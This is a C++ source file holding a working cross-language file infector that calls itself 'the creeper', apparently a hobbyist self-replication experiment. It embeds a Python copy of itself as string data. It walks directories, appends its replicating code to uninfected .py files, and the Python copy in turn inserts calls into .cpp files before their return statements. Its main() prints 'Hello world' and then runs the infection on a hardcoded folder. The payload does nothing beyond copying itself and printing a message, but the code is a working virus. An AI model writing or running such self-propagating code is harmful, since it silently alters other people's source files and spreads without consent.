#include <iostream>
#include <vector>

std::vector<std::string> nextGeneration = {
"# ========I'm the creeper:========",
"import sys",
"import os",
"",
"with open(sys.argv[0], \"r\") as file:",
"    replicate = file.readlines()",
"    pos = [i for (i, line) in enumerate(replicate)",
"           if \"# ========I'm the creeper\" in line or \"# ========Catch me if you can\" in line]",
"    replicate = [line.replace('\\\\', '\\\\\\\\').replace('\"', '\\\\\"')",
"                 for line in replicate[pos[0]:pos[-1] + 1]]",
"",
"",
"def find(pattern, path):",
"    for root, dirs, files in os.walk(path):",
"        for name in list(filter(lambda f: pattern in f, files)):",
"            path = os.path.join(root, name)",
"            with open(path, \"r\") as file:",
"                copyFile = file.readlines()",
"                notInfected = not list(",
"                    filter(lambda line: \"I'm the creeper\" in line, copyFile))",
"                retPos = [i for i, line in enumerate(",
"                    copyFile) if notInfected and \"return\" in line]",
"                if notInfected and retPos:",
"                    for i in retPos:",
"                        copyFile[i] = \"\\tCreeper(\\\"\" + str(root) + \\",
"                            \"/\\\", \\\".py\\\");\\n\" + copyFile[i]",
"                    return path, copyFile",
"    return None, None",
"",
"",
"path, copyFile = find(",
"    \".cpp\", \"/mnt/d/Program/template/src/python/OuroborosPrograms\")",
"",
"print(\"Path -- \", path)",
"",
"if path:",
"    print(\"I'm the creeper, catch me if you can\")",
"",
"    newFile = [nextGeneration[1] + \"\\n\", nextGeneration[3] + \"\\n\\n\"]",
"    newFile.append('std::vector<std::string> nextGeneration = {\\n')",
"    newFile.extend(['\"{0}\",\\n'.format(line[0:-1]) for line in replicate])",
"    newFile.append(\"};\\n\\n\")",
"",
"    newFile.extend([\"{0}\\n\".format(line) for line in nextGeneration])",
"    newFile.extend(copyFile)",
"    with open(path, \"w\") as file:",
"        file.writelines(newFile)",
"# ========Catch me if you can========",
};

// ========I'm the creeper:========
#include <iostream>
#include <fstream>
#include <vector>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

#define MVECTOR std::vector<std::string>

MVECTOR readFile(std::string name)
{
    MVECTOR buffer;
    std::ifstream file(name);
    if (!file)
        return buffer;
    std::string line;
    while (getline(file, line))
        buffer.push_back(line);
    return buffer;
}

template <bool dir = true>
int getIndex(MVECTOR &vect, std::string subString)
{
    for (int i = 0; i < vect.size(); i++)
        if (vect[i].find(subString) != std::string::npos)
            return i;
    return -1;
}

template <>
int getIndex<false>(MVECTOR &vect, std::string subString)
{
    for (int i = vect.size() - 1; i >= 0; i--)
        if (vect[i].find(subString) != std::string::npos)
            return i;
    return -1;
}

MVECTOR Walker(std::string pattern)
{
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    MVECTOR path;
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0)
                continue;
            if (dir->d_type == DT_DIR)
            {
                chdir(dir->d_name);
                auto result = Walker(pattern);
                chdir("..");
                if (!result.empty())
                {
                    for (auto &p : result)
                        p = std::string(dir->d_name) + "/" + p;
                    path.insert(path.end(), result.begin(), result.end());
                }
            }

            bool find = std::string(dir->d_name).find(pattern) != std::string::npos;
            if (find)
                path.push_back(dir->d_name);
        }
        closedir(d);
    }
    return path;
}

void Creeper(const char *root, std::string pattern)
{
    auto files = Walker(pattern);
    MVECTOR replicate;
    int begin;
    int end;
    for (auto name : files)
    {
        replicate = readFile(name);
        begin = getIndex<>(replicate, "// ========I'm the creeper");
        end = getIndex<false>(replicate, "// ========Catch me if you can");
        if (begin != -1 && end != -1)
            break;
    }

    if (begin == -1 || end == -1)
        return;

    chdir(root);
    files = Walker(pattern);
    MVECTOR copyFile;
    std::string fileName;

    for (auto name : files)
    {
        copyFile = readFile(name);
        if (getIndex<>(copyFile, "I'm the creeper") == -1)
        {
            fileName = name;
            break;
        }
    }

    if (fileName.empty())
        return;

    std::cout << "Path: " + std::string(root) + fileName + "\n\n";
    std::cout << "I'm the creeper, catch me if you can \n";

    copyFile.push_back("nextGeneration = [");
    copyFile.insert(copyFile.end(), replicate.begin() + begin, replicate.begin() + end + 1);
    copyFile.push_back("]\n");
    copyFile.insert(copyFile.end(), nextGeneration.begin(), nextGeneration.end());

    std::ofstream file(fileName);
    for (auto line : copyFile)
        file << line << std::endl;
    file.close();
}
// ========Catch me if you can========
#include <iostream>

int main(int argc, char *argv[])
{
    std::cout << "Hello world" << std::endl;

	Creeper("/mnt/d/Program/template/src/python/OuroborosPrograms/", ".py");
    return 0;
}